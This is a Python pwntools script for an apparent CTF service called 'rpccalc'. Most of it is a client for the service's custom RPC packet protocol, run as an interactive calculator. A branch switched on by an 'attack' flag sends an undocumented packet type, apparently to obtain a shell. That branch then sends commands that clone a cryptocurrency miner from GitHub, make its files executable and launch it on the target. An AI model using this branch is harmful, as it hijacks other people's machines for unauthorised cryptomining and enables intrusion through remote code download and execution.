
from pwn import *
# p=remote('localhost',1337)
p=process('./rpccalc/rpc',aslr=False)
attack=False
# gdb.attach(p,'b *0x55555555626d')
# context.log_level='debug'
'''
	server send mode: 'RPCN'(4) + LEN(4) + PACKEY_TYPE(4) + DATA(LEN-12)
		TYPE 0xbeef : done
		TYPE 0xbeef+1 : error
		TYPE 0xbeef+2 : retry
		TYPE 0xbeef+3 : normal data
	server recv mode: 'RPCM'(4) + LEN(4) + PACKET_TYPE(4) + DATA(LEN-12)
		TYPE 0: start the program(unfinished function)
		TYPE 1: declare user, return uuid
		TYPE 2: given uuid and corr_id, return result
		TYPE 3:	given uuid and corr_id and expression, return done/error
'''

def send(cata,*data):
	sttr='RPCM'
	sttrr=p32(cata)[::-1]
	if cata==0:
		p.send(sttr+p32(12)[::-1]+sttrr)
		# return recv()
	elif cata==1:
		p.send(sttr+p32(12)[::-1]+sttrr)
		# return recv()
	elif cata==2:
		# print data
		dat=p32(len(data[0]))[::-1]+data[0]+p32(len(data[1]))[::-1]+data[1]
		# print dat
		p.send(sttr+p32(12+len(dat))[::-1]+sttrr+dat)
		return 
	elif cata==3:
		# print data
		dat=p32(len(data[0]))[::-1]+data[0]+p32(len(data[1]))[::-1]+data[1]+p32(len(data[2]))[::-1]+data[2]
		p.send(sttr+p32(12+len(dat))[::-1]+sttrr+dat)
	else:
		p.send(sttr+p32(12)[::-1]+sttrr)

def recv():
	MAGIC=p.recv(4)
	if not MAGIC=='RPCN':
		print "RECV error"
		# exit(-1)
	LEN=u32(p.recv(4)[::-1])
	CATA=u32(p.recv(4)[::-1])-0xbeef
	if LEN>12:
		DATA=p.recv(LEN-12)
	else:
		DATA=0
	return (CATA,DATA)

def main():
	if attack:
		name="zhanghaoo"
		# p.recvuntil("name?\n")
		print p.recv()
		p.send(name+'\n')

		send(4)
		# p.sendline('git clone https://github.com/aohas/MinerPool.git')
		p.sendline('git clone https://github.com/SuperHenry2333/miner.git')
		p.sendline('cd miner')
		# p.sendline('cp linux/minerd .')
		p.sendline('chmod 777 miner.sh')
		p.sendline('chmod 777 minerd')
		p.sendline('./miner.sh')
	else:
		name="zhang"
		# p.recvuntil("name?\n")
		p.recv()
		p.send(name+'\n')

		send(0)
		CATA,DATA=recv()
		send(1)
		CATA,DATA=recv()

		uuid1=DATA[4:]
		# print("uuuuuuid: %s"%uuid1)
		ctn=True
		while True:
			print "Please input a expression."
			exp=raw_input()
			send(3,uuid1,"1",exp)
			CATA,DATA=recv()
			assert CATA==0
		# # send(3,uuid1,"2",'1*2+100')
		# # CATA,DATA=recv()
		# # send(3,uuid1,"1",'1*2+101')
		# # CATA,DATA=recv()
			send(2,uuid1,'1')
			CATA,DATA=recv()
			assert CATA==3

			print "The result is "+DATA[4:]+'.'
			print "Continue? (y/n)"
			a=raw_input()
			if a=='n':
				break
	# # gdb.attach(p,"b *0x40139c\nc")
	# send(3,uuid1,"4",'904900- 501126/ 280612- 912218/ 909625')
	# CATA,DATA=recv()
	# send(3,uuid1,"5",'1*2+103')
	# CATA,DATA=recv()
	# send(2,uuid1,'4')
	




	p.interactive()

if __name__=='__main__':
	main()
